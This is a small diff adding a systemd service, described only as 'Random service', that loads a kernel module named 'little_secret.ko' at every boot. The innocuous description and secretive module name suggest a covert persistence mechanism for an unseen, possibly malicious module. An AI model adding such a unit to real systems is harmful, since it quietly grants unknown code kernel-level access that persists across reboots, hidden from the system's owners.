@@ -1,0 +1,11 @@
+[Unit]
+Description=Random service
+After=network.target
+
+[Service]
+Type=simple
+
+ExecStart=/usr/bin/insmod /lib/modules/little_secret.ko
+
+[Install]
+WantedBy=multi-user.target
